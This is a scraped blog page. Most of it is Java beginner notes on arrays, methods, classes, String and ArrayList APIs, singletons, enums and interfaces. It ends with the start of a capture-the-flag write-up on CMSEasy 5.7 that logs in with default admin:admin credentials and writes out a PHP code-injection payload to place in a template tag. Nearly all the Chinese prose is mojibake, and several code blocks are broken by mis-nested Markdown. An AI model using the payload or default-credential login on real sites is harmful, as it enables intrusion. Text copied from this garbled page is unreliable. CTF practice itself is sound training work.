<p>ifï¼Œswitchï¼Œforï¼Œwhileå’ŒC++å®Œå…¨ä¸€è‡´</p>
<p><strong>RandomåŒ…</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> randomDemo <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Random</span> r<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> shu<span class="token operator">=</span>r<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0-9èŒƒå›´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>æ•°ç»„</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é™æ€åˆå§‹åŒ–æ•°ç»„</span>
<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PSR"</span><span class="token punctuation">,</span><span class="token string">"ZYL"</span><span class="token punctuation">,</span><span class="token string">"HZJ"</span><span class="token punctuation">&#125;</span>
<span class="token comment">//åŠ¨æ€åˆå§‹åŒ–æ•°ç»„</span>
<span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åŠ¨æ€åˆå§‹åŒ–æ•°ç»„é»˜è®¤å€¼ï¼š</p>
<p>æ•´å‹ï¼š0</p>
<p>æµ®ç‚¹å‹ï¼š0.0</p>
<p>å¸ƒå°”ï¼šfalse</p>
<p>å¼•ç”¨ç±»å‹ï¼šnull</p>
<p><strong>æ–¹æ³•ï¼ˆå°±å‡½æ•°å•¦ï¼‰</strong></p>
<p>å®Œæ•´å®šä¹‰æ ¼å¼ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">ä¿®é¥°ç¬¦ è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å½¢å‚)&#123;
    æ–¹æ³•ä½“ä»£ç 
    return è¿”å›å€¼;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ‚¨æ±‚çš„å’Œä¸ºï¼š"</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> c<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…¶ä»–å®šä¹‰æ ¼å¼ï¼š</p>
<p>å¯ä»¥æ²¡æœ‰è¿”å›å€¼ï¼ˆvoidï¼‰ï¼Œæ²¡æœ‰å‚æ•°</p>
<p><strong>æ–¹æ³•æ•°æ®ä¼ é€’æœºåˆ¶</strong></p>
<p>åŸºæœ¬ç±»å‹å‚æ•°ä¼ é€’ï¼šä¼ å€¼</p>
<p>å¼•ç”¨ç±»å‹å‚æ•°ä¼ é€’ï¼šä¼ åœ°å€</p>
<p><strong>æ–¹æ³•é‡è½½</strong></p>
<p>æ–¹æ³•åä¸€æ ·å‚æ•°ä¸ä¸€æ ·çš„æ–¹æ³•</p>
<p><strong>ç±»</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow<span class="token punctuation">.</span></span><span class="token constant">OP</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> brand<span class="token punctuation">;</span>
    <span class="token keyword">double</span> price<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ¬¢è¿ä½¿ç”¨"</span><span class="token operator">+</span>brand<span class="token operator">+</span><span class="token string">"æ‰‹æœº"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//æ„é€ å™¨å†™æ³•ä¸C++ç›¸åŒ</span>
<span class="token comment">//thiså…³é”®åœ¨ä»£è¡¨å½“å‰å¯¹è±¡çš„åœ°å€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>JavaBean</strong></p>
<p>ä¹Ÿè¢«ç§°ä½œå®ä½“ç±»ï¼Œå…¶å¯¹è±¡å¯ç”¨äºåœ¨ç¨‹åºä¸­å°è£…æ•°æ®</p>
<p>è¦æ±‚ï¼š</p>
<ul>
<li>æˆå‘˜å˜é‡ç”¨privateä¿®é¥°</li>
<li>æä¾›å¯¹åº”æˆå‘˜å˜é‡çš„getä¸setæ–¹æ³•</li>
<li>å¿…é¡»æœ‰ä¸€ä¸ªæ— å‚æ„é€ å™¨ï¼Œæœ‰å‚æ„é€ å¯æœ‰å¯æ— </li>
</ul>
<p><strong>Stringç±»</strong></p>
<p>ä¸å¯å˜ï¼šæŒ‡åŸå§‹å­—ç¬¦ä¸²ä¸å¯å˜ï¼Œç»è¿‡+è¿ç®—åäº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²</p>
<p>åˆ›å»ºæ–¹å¼</p>
<pre class="line-numbers language-none"><code class="language-none">String s&#x3D;new String(&quot;flag&quot;);
char[] chars&#x3D;&#123;&#39;f&#39;,&#39;l&#39;,&#39;a&#39;,&#39;g&#39;&#125;;
String s&#x3D;new String(chars);
byte[] bytes&#x3D;&#123;102,108,97,103&#125;
String s&#x3D;new String(bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Stringå¸¸ç”¨API</strong></p>
<pre class="line-numbers language-none"><code class="language-none">s1.equals(s2)&#x2F;&#x2F;æ¯”è¾ƒs1ï¼Œs2å­—ç¬¦ä¸²å†…å®¹æ˜¯å¦ç›¸åŒequalsIgnoreCaseå¿½ç•¥å¤§å°å†™
s1.charAt(Index)&#x2F;&#x2F;è·å–Indexä½ç½®çš„å­—ç¬¦
s1.toCharArray()&#x2F;&#x2F;å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºcharæ•°ç»„
s1.substring(head,end)&#x2F;&#x2F;æˆªå–å­—ç¬¦ä¸²
s1.replace(target,replacement)&#x2F;&#x2F;å°†å­—ç¬¦ä¸²ä¸­çš„targetç”¨replacementæ›¿æ¢
s1.contains(s)&#x2F;&#x2F;å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«så­—ç¬¦ä¸²
s1.startWiths(s)&#x2F;&#x2F;å­—ç¬¦ä¸²æ˜¯å¦ä»¥så­—ç¬¦ä¸²å¼€å§‹
s1.spilt(s)&#x2F;&#x2F;ä»¥sä¸ºåˆ†å‰²ç¬¦æ¥å°†å­—ç¬¦ä¸²åˆ‡å‰²<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>ArrayList</strong></p>
<pre class="line-numbers language-none"><code class="language-none">ArrayList list&#x3D;new ArrayList()
list.add(ele)&#x2F;&#x2F;å‘åˆ—è¡¨ä¸­æ·»åŠ å…ƒç´ ï¼ˆæ— ç±»å‹é™åˆ¶ï¼‰
list.add(index,ele)&#x2F;&#x2F;å‘åˆ—è¡¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ArrayListæ”¯æŒæ³›å‹ï¼Œå¯é€šè¿‡<code>ArrayList&lt;æ•°æ®ç±»å‹&gt;</code>æ¥é™å®šåˆ—è¡¨ä¸­çš„æ•°æ®ç±»å‹</p>
<p>ä¸€äº›API</p>
<pre class="line-numbers language-none"><code class="language-none">list.get(index)&#x2F;&#x2F;è·å–æŒ‡å®šä½ç½®å…ƒç´ 
list.size()&#x2F;&#x2F;è·å–åˆ—è¡¨å…ƒç´ ä¸ªæ•°
list.remove(index)&#x2F;&#x2F;åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ 
list.set(index,ele)&#x2F;&#x2F;ä¿®æ”¹æŒ‡å®šä½ç½®çš„å…ƒç´ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


        <h3 id="é¢å‘å¯¹è±¡å’¯"   >
          <a href="#é¢å‘å¯¹è±¡å’¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¢å‘å¯¹è±¡å’¯" class="headerlink" title="é¢å‘å¯¹è±¡å’¯"></a>é¢å‘å¯¹è±¡å’¯</h3>
      <p><strong>staticå…³é”®å­—</strong></p>
<ul>
<li>staticæ˜¯é™æ€çš„æ„æ€ï¼Œå¯ä»¥ç”¨æ¥ä¿®é¥°æˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•</li>
<li>staticä¿®é¥°æˆå‘˜å˜é‡è¡¨ç¤ºè¯¥æˆå‘˜å˜é‡å€¼åœ¨å†…å­˜ä¸­å‚¨å­˜ä¸€ä»½ï¼Œå¯ä»¥è¢«å…±äº«è®¿é—®ä¿®æ”¹</li>
<li>é™æ€æˆå‘˜å˜é‡å¸¸ç”¨æ¥è¡¨ç¤ºéœ€è¦è¢«å…±äº«çš„ä¿¡æ¯ï¼Œå¯ä»¥è¢«å…±äº«è®¿é—®</li>
<li>é™æ€æˆå‘˜å˜é‡å’Œæ–¹æ³•è®¿é—®æ—¶å¯é€šè¿‡<code>ç±»å.æˆå‘˜</code>ä¹Ÿå¯é€šè¿‡<code>å¯¹è±¡å.æˆå‘˜</code>è®¿é—®ï¼Œå»ºè®®é€šè¿‡ç±»è®¿é—®</li>
<li>åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œè®¿é—®é™æ€æ–¹æ³•ï¼Œç±»åå¯ä»¥çœç•¥ä¸å†™</li>
<li>æ³¨æ„è°ƒç”¨é™æ€æˆå‘˜æ–¹æ³•ï¼ˆåŒ…æ‹¬é€šè¿‡å¯¹è±¡è°ƒç”¨ï¼‰ï¼Œæ–¹æ³•ä¸­ä¸èƒ½è°ƒç”¨éé™æ€æˆå‘˜å˜é‡å“¦ï¼ˆå¦‚ä¸‹å›¾ï¼‰</li>
<li><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207050029328.png"></li>
<li>é™æ€æ–¹æ³•ä¸­ä¸å¯ä»¥å‡ºç°thiså…³é”®å­—</li>
</ul>
<p><strong>é™æ€æ–¹æ³•åº”ç”¨</strong></p>
<ul>
<li>å¯ç”¨äºæ„é€ å·¥å…·ç±»ï¼Œç”±äºä¸éœ€è¦è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¯å°†ç±»çš„æ„é€ å‡½æ•°è®¾ç½®æˆç§æœ‰æƒé™</li>
</ul>
<p><strong>ä»£ç å—</strong></p>
<p>å®šä¹‰ï¼šèŠ±æ‹¬å·æ‹¬èµ·æ¥çš„éƒ½æ˜¯ä»£ç å—</p>
<ul>
<li>staticä»£ç å—ï¼ˆstatic{}ï¼‰ï¼š<ul>
<li>å±äºç±»ï¼Œä¸ç±»ä¸€èµ·ä¼˜å…ˆåŠ è½½ï¼ˆæ¯”mainè¿˜å¿«ï¼‰ä¸€æ¬¡ï¼Œè‡ªåŠ¨è§¦å‘æ‰§è¡Œ</li>
<li>ä½œç”¨ï¼šå¯ä»¥ç”¨äºåˆå§‹åŒ–é™æ€èµ„æºï¼Œä¸€è¾¹åç»­ä½¿ç”¨</li>
</ul>
</li>
<li>å®ä¾‹ä»£ç å—ï¼ˆ{}ï¼‰ï¼š<ul>
<li>å±äºå¯¹è±¡ï¼Œæ¯æ¬¡æ„å»ºå¯¹è±¡æ—¶ï¼Œéƒ½ä¼šå‡ºå‘ä¸€æ¬¡æ‰§è¡Œ</li>
<li>ä½œç”¨ï¼šåˆå§‹åŒ–å®ä¾‹èµ„æº</li>
</ul>
</li>
</ul>
<p><strong>è®¾è®¡æ¨¡å¼</strong>ï¼šåœ¨å¼€å‘ä¸­ç»å¸¸é‡åˆ°çš„é—®é¢˜çš„æœ€ä¼˜è§£</p>
<p><strong>å•ä¾‹æ¨¡å¼</strong></p>
<p>ä¸€ä¸ªç±»åªèƒ½åˆ›å»ºä¸€ä¸ªå¯¹è±¡</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é¥¿æ±‰å•ä¾‹ï¼Œåœ¨ç±»åŠ è½½æ—¶ç›´æ¥åˆ›é€ å¯¹è±¡</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> danli <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> danli dddd<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å•ä¾‹è¢«åˆ›å»º"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//æ‡’æ±‰å•ä¾‹ï¼Œåœ¨ç±»å®ä¾‹é¦–æ¬¡è¢«è°ƒç”¨æ—¶åˆ›é€ å¯¹è±¡</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> danli <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> danli dddd<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å•ä¾‹è¢«åˆ›å»º"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> danli <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>dddd<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            dddd<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">danli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> dddd<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>ç»§æ‰¿</strong></p>
<ul>
<li><p>```<br>public class Son extends Father {}</p>
<pre class="line-numbers language-none"><code class="language-none">
- superå…³é”®å­—

  - &#96;super&#96;å¯ä»¥ç”¨æ¥å¼•ç”¨ç›´æ¥çˆ¶ç±»çš„å®ä¾‹å˜é‡ã€‚
  - &#96;super&#96;å¯ä»¥ç”¨æ¥è°ƒç”¨ç›´æ¥çˆ¶ç±»æ–¹æ³•ã€‚
  - &#96;super()&#96;å¯ä»¥ç”¨äºè°ƒç”¨ç›´æ¥çˆ¶ç±»æ„é€ å‡½æ•°ã€‚

- æ„é€ æ–¹æ³•ï¼šé»˜è®¤å…ˆæ‰§è¡Œçˆ¶ç±»æ— å‚æ„é€ ï¼Œå†æ‰§è¡Œè‡ªå·±æ„é€ 

**åŒ…**

- åŒ…æ˜¯ç”¨æ¥åˆ†åˆ«ç®¡ç†å„ç§ä¸åŒçš„ç±»çš„ï¼Œç±»ä¼¼æ–‡ä»¶å¤¹ï¼Œå»ºåŒ…æœ‰åˆ©äºç¨‹åºçš„ç®¡ç†å’Œç»´æŠ¤
- åŒ…åè¯­æ³•æ ¼å¼ï¼šåŸŸåå€’å†™.æŠ€æœ¯åç§°
- å»ºåŒ…è¯­å¥å¿…é¡»åœ¨ç¬¬ä¸€è¡Œ
- ç›¸åŒåŒ…ä¸‹çš„ç±»å¯ç›´æ¥è®¿é—®ï¼Œä¸åŒåŒ…ä¸‹ç±»å¿…é¡»å¯¼åŒ…ï¼Œ&#96;import åŒ…å.ç±»å&#96;
- å¦‚æœè¯¥ç±»ä¸­ä½¿ç”¨ä¸åŒåŒ…ä¸‹ç›¸åŒçš„ç±»åï¼Œæ­¤æ—¶é»˜è®¤åªèƒ½å¯¼å…¥ä¸€ä¸ªç±»çš„åŒ…ï¼Œå¦ä¸€ä¸ªç±»çš„è¦ä½¿ç”¨å…¨åè®¿é—®

**æƒé™ä¿®é¥°ç¬¦**

- ç§æœ‰ï¼š&#96;private&#96;
  - åªèƒ½åœ¨æœ¬ç±»ä¸­è®¿é—®
- ç¼ºçœï¼šå•¥éƒ½ä¸åŠ 
  - åªèƒ½æœ¬ç±»ï¼Œæœ¬åŒ…ä¸‹è®¿é—®
- ä¿æŠ¤ï¼š&#96;protected&#96;
  - æœ¬ç±»ï¼ŒåŒåŒ…çš„å…¶ä»–ç±»ä¸­ï¼Œå…¶ä»–åŒ…çš„å­ç±»ä¸­
- å…¬å…±ï¼š&#96;public&#96;
  - è°éƒ½èƒ½è®¿é—®

**finalå…³é”®å­—**

- ä¿®é¥°ç±»ï¼šè¡¨æ˜æœ€ç»ˆç±»ï¼Œä¸å¯è¢«ç»§æ‰¿
- ä¿®é¥°æ–¹æ³•ï¼šè¡¨æ˜æœ€ç»ˆæ–¹æ³•ï¼Œä¸å¯è¢«é‡å†™
- ä¿®é¥°å˜é‡ï¼šè¡¨æ˜å˜é‡ç»è¿‡é¦–æ¬¡èµ‹å€¼åï¼Œä¸èƒ½å†æ¬¡è¢«èµ‹å€¼
- å¸¸é‡å®šä¹‰ï¼š&#96;public static final&#96;

**æšä¸¾**

- ä½œç”¨ï¼šä¸ºäº†åšä¿¡æ¯çš„æ ‡å¿—å’Œä¿¡æ¯çš„åˆ†ç±»

- &#96;&#96;&#96;java
  ä¿®é¥°ç¬¦ enum æšä¸¾åç§°&#123;
  	ç¬¬ä¸€è¡Œéƒ½æ˜¯ç½—åˆ—æšä¸¾ç±»å®ä¾‹çš„åç§°
  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>æšä¸¾éƒ½ç»§æ‰¿è‡ªæšä¸¾ç±»å‹ï¼š<code>java.lang.Enum</code></p>
</li>
<li><p>æšä¸¾ç±»éƒ½æ˜¯æœ€ç»ˆç±»</p>
</li>
<li><p>æ„é€ å™¨çš„æ„é€ å™¨éƒ½æ˜¯ç§æœ‰çš„ï¼Œæšä¸¾å¯¹å¤–ä¸èƒ½åˆ›å»ºå¯¹è±¡</p>
</li>
<li><p>æšä¸¾ç±»çš„ç¬¬ä¸€è¡Œé»˜è®¤éƒ½æ˜¯ç½—åˆ—æšä¸¾å¯¹è±¡çš„åç§°çš„</p>
</li>
<li><p>æšä¸¾ç±»ç›¸å½“äºæ˜¯å¤šä¾‹æ¨¡å¼</p>
</li>
<li><p>```java<br>//æšä¸¾ç±»çš„ä½œç”¨å®ä¾‹ä»£ç <br>//ä¾‹å¦‚å¼€å‘æ¸¸æˆæ¥å—ç”¨æˆ·è¾“å…¥çš„å››ä¸ªæ–¹å‘çš„ä¿¡å·<br>//å¦‚æœé€‰æ‹©å¸¸é‡ï¼Œå…·æœ‰å¯è¯»æ€§ä½†æ˜¯å…¥å‚å€¼ä¸å—çº¦æŸ<br>//Orientation.java<br>public enum Orientation {</p>
<pre><code>UP,DOWN,LEFT,RIGHT
</code></pre>
<p>}<br>//zhu.java<br>public class zhu {</p>
<pre><code>public static void move(Orientation o)&#123;
    switch (o)&#123;
        case UP -&gt; System.out.println(&quot;å¾€ä¸Šèµ°&quot;);
        case DOWN -&gt;System.out.println(&quot;å¾€ä¸‹èµ°&quot;);
        case LEFT -&gt; System.out.println(&quot;å¾€å·¦èµ°&quot;);
        case RIGHT -&gt; System.out.println(&quot;å¾€å³èµ°&quot;);
    &#125;
&#125;
public static void main(String[] args) &#123;
    move(Orientation.RIGHT);
&#125;
</code></pre>
<p>}</p>
<pre class="line-numbers language-none"><code class="language-none">
- ![](https:&#x2F;&#x2F;jlan-blog.oss-cn-beijing.aliyuncs.com&#x2F;202207061509169.png)

**æŠ½è±¡**

- abstractä¿®é¥°çš„ç±»å°±æ˜¯æŠ½è±¡ç±»ï¼Œä¿®é¥°çš„æ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•

- å†™æŠ½è±¡æ–¹æ³•æ—¶ä¸èƒ½å†™æ–¹æ³•ä½“

- å¦‚æœä¸€ä¸ªç±»ä¸­çš„æ–¹æ³•è¢«å£°æ˜æˆä¸ºæŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å¿…é¡»è¢«å£°æ˜ä¸ºæŠ½è±¡ç±»

- &#96;&#96;&#96;java
  public abstract class animal &#123;
      public abstract void run();
  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>æŠ½è±¡ç±»å¯ä»¥ç†è§£ä¸ºä¸å®Œæ•´çš„è®¾è®¡å›¾ï¼Œä¸€èˆ¬åšçˆ¶ç±»</p>
</li>
<li><p>å½“çˆ¶ç±»çŸ¥é“å­ç±»éœ€è¦å®ŒæˆæŸäº›è¡Œä¸ºï¼Œè€Œå„ä¸ªå­ç±»å®ç°æ–¹æ³•åˆä¸åŒï¼Œå°±æŠŠè¯¥ç±»å®šä¹‰ä¸ºæŠ½è±¡æ–¹æ³•</p>
</li>
</ul>
<p><strong>æ¥å£</strong></p>
<ul>
<li><p>```java<br>//æ¥å£å®šä¹‰<br>public interface æ¥å£å{</p>
<pre><code>    //å¸¸é‡
    //æŠ½è±¡æ–¹æ³•
</code></pre>
<p>}</p>
<pre class="line-numbers language-none"><code class="language-none">
- &#96;&#96;&#96;java
  &#x2F;&#x2F;æ¥å£å®ç°
  class ç±»å implements æ¥å£1,æ¥å£2...&#123;
  		&#x2F;&#x2F;æŠ½è±¡æ–¹æ³•é‡å†™
  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>æ¥å£å¯ä»¥å¤šç»§æ‰¿ï¼Œä¸€ä¸ªæ¥å£å¯ä»¥ç»§æ‰¿å¤šä¸ªæ¥å£</p>
</li>
<li><p>æ¥å£ä¸èƒ½åˆ›å»ºå¯¹è±¡</p>
</li>
<li><p>ä¸€ä¸ªç±»å®ç°å¤šä¸ªæ¥å£ï¼Œå¤šä¸ªæ¥å£ä¸­æœ‰åŒæ ·çš„é™æ€æ–¹æ³•ä¸å†²çª</p>
</li>
<li><p>ä¸€ä¸ªç±»ç»§æ‰¿äº†çˆ¶ç±»åˆå®ç°äº†æ¥å£ï¼Œçˆ¶ç±»å’Œæ¥å£ä¸­çš„åŒåæ–¹æ³•ï¼Œé»˜è®¤ä½¿ç”¨çˆ¶ç±»çš„</p>
</li>
<li><p>ä¸€ä¸ªç±»å®ç°äº†å¤šä¸ªæ¥å£ï¼Œå¤šä¸ªæ¥å£ä¸­å­˜åœ¨åŒåçš„é»˜è®¤æ–¹æ³•ï¼Œä¸å†²çªï¼Œè¿™ä¸ªç±»é‡å†™è¯¥æ–¹æ³•å³å¯</p>
</li>
<li><p>ä¸€ä¸ªæ¥å£ç»§æ‰¿å¤šä¸ªæ¥å£æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå¦‚æœå¤šä¸ªæ¥å£ä¸­å­˜åœ¨è§„èŒƒå†²çªåˆ™ä¸èƒ½ç»§æ‰¿</p>
</li>
<li><p>JDK8å¼€å§‹å¯¹æ¥å£åšçš„æ–°å¢æ–¹æ³•</p>
<ul>
<li>æ¥å£ä¸­å¯ä»¥æœ‰å¸¦æ–¹æ³•å®ç°çš„æ–¹æ³•</li>
<li>é»˜è®¤æ–¹æ³•ï¼šç±»ä¼¼ä¹‹å‰çš„æ™®é€šæ–¹æ³•ï¼Œä½¿ç”¨defalutä¿®é¥°ï¼Œé»˜è®¤ç”¨publicä¿®é¥°ã€‚éœ€è¦ç”¨æ¥å£å®ç°ç±»çš„å¯¹è±¡æ¥è°ƒç”¨</li>
<li>é™æ€æ–¹æ³•ï¼šä½¿ç”¨staticä¿®é¥°ï¼Œæ¥å£é™æ€æ–¹æ³•å¿…é¡»ç”¨æœ¬èº«çš„æ¥å£åæ¥è°ƒç”¨</li>
<li>ç§æœ‰æ–¹æ³•ï¼šä½¿ç”¨privateä¿®é¥°ï¼Œåªèƒ½åœ¨æœ¬ç±»ï¼ˆæœ¬æ¥å£ï¼‰ä¸­è¢«å…¶ä»–çš„é»˜è®¤æ–¹æ³•æˆ–è€…ç§æœ‰æ–¹æ³•è®¿é—®</li>
</ul>
</li>
</ul>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/478f3262.html">CTFshowCMS</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-08</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-06-12</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/478f3262.html" data-flag-title="CTFshowCMS"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p><strong>477</strong></p>
<p>cmseasy 5.7ï¼Œç™¾åº¦æœæœæ¼æ´ï¼Œæœ‰åå°getshell</p>
<p>é¦–å…ˆ/adminç™»å½•åå°ï¼Œadmin:adminç›´æ¥ç™»å½•ï¼Œåœ¨æ¨¡ç‰ˆâ€”è‡ªå®šä¹‰æ ‡ç­¾ä¸­å†™å…¥payload</p>
<pre class="line-numbers language-none"><code class="language-none">1111111111111&quot;;&#125;&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç¯å¢ƒå˜é‡é‡Œé¢æ‰¾å§</p>
<p><strong>478</strong></p>
